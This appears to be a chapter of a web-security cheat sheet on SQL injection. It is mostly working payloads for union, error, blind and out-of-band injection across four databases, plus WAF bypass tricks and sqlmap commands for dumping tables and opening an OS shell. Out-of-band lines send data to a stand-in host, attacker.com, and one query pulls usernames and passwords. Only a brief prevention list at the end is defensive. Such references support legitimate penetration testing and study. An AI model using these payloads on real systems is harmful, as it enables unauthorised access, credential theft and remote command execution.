# SQL Injection (SQLi)

SQL injection occurs when user input is incorporated into SQL queries without proper sanitization or parameterization, allowing an attacker to manipulate the query logic.

## Types of SQL Injection

### 1. In-band SQLi (Error-based & Union-based)

**Error-based:** Extract data through database error messages.
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables--
```

**Union-based:** Use UNION to combine results.
```sql
' ORDER BY 1--  (determine column count)
' UNION SELECT 1,2,3,4,5--  (test column positions)
' UNION SELECT 1,2,3,4,group_concat(table_name) FROM information_schema.tables--
' UNION SELECT 1,2,3,4,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,2,3,4,group_concat(username,0x3a,password) FROM users--
```

### 2. Blind SQLi (Boolean & Time-based)

**Boolean-based:** Infer truth from response differences.
```
' AND 1=1--  (true, normal response)
' AND 1=2--  (false, different response)
' AND SUBSTRING((SELECT @@version),1,1)='5'--
```

**Time-based:** Infer truth from response delay.
```
' IF (1=1) WAITFOR DELAY '0:0:5'--  (SQL Server)
' AND SLEEP(5)--  (MySQL)
' AND pg_sleep(5)--  (PostgreSQL)
```

### 3. Out-of-band SQLi

Data exfiltrated through DNS/HTTP to attacker-controlled server.
```sql
' EXEC master..xp_dirtree '//attacker.com/table'--  (SQL Server)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\test'))--  (MySQL)
```

## Database-Specific Techniques

### MySQL
```sql
' UNION SELECT 1,@@version,3,4,5--  (version)
' UNION SELECT 1,user(),3,4,5--  (current user)
' UNION SELECT 1,database(),3,4,5--  (current DB)
-- Comment: --, #, /*!
-- Unique: INTO OUTFILE, LOAD_FILE, INTO DUMPFILE
```

### PostgreSQL
```sql
' UNION SELECT 1,version(),3--
' UNION SELECT 1,current_database(),3--
' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables--
-- Comment: --, /*
-- Unique: CAST, XML functions (query_to_xml)
```

### SQL Server
```sql
' UNION SELECT 1,@@version,3,4--
' UNION SELECT 1,db_name(),3,4--
' UNION SELECT 1,STRING_AGG(table_name,','),3,4 FROM information_schema.tables--
-- Comment: --, /*, %00
-- Unique: xp_cmdshell (RCE), OPENROWSET, SELECT INTO OUTFILE
```

### Oracle
```sql
' UNION SELECT '1','2' FROM dual--
' UNION SELECT 1,(SELECT banner FROM v$version),3 FROM dual--
' UNION SELECT 1,table_name,3 FROM all_tables--
-- Comment: --, /*, %00
-- Unique: FROM dual required, no LIMIT (use ROWNUM)
```

## WAF Bypass Techniques

- **Case variation**: `UnIoN sElEcT`
- **Comments**: `UN/**/ION SEL/**/ECT`
- **Hex encoding**: `0x756e696f6e` = 'union'
- **Double URL encoding**: `%2532%370`
- **Null bytes**: `%00' UNION SELECT...`
- **Buffer overflow**: `?id=1'+AND+1=1+AND+1=2` + junk
- **HTTP Parameter Pollution**: `?id=1&id=2&id=3 UNION SELECT...`

## Automation

### sqlmap
```bash
# Basic run
sqlmap -u "https://target.com/page?id=1" --batch

# With cookie/auth
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc" --batch

# Get databases
sqlmap -u "https://target.com/page?id=1" --dbs

# Get tables
sqlmap -u "https://target.com/page?id=1" -D dbname --tables

# Dump data
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "https://target.com/page?id=1" --os-shell

# Request from file (Burp)
sqlmap -r request.txt --batch

# Level/Risk tuning
sqlmap -u "https://target.com/page?id=1" --level=3 --risk=2
```

### NoSQLMap
```bash
nosqlmap --url "https://target.com/api/login" -A login
```

## Prevention Best Practices

1. **Prepared statements / parameterized queries** (always)
2. **Stored procedures** (safe if parameterized)
3. **Input validation** (allow-list approach preferred)
4. **Least privilege** — DB user should not have excessive permissions
5. **WAF** — Defense in depth (not sole protection)
6. **ORM frameworks** — Use safe ORM methods (avoid raw queries)

---

> **Next**: [NoSQL Injection](04-nosql-injection.md)
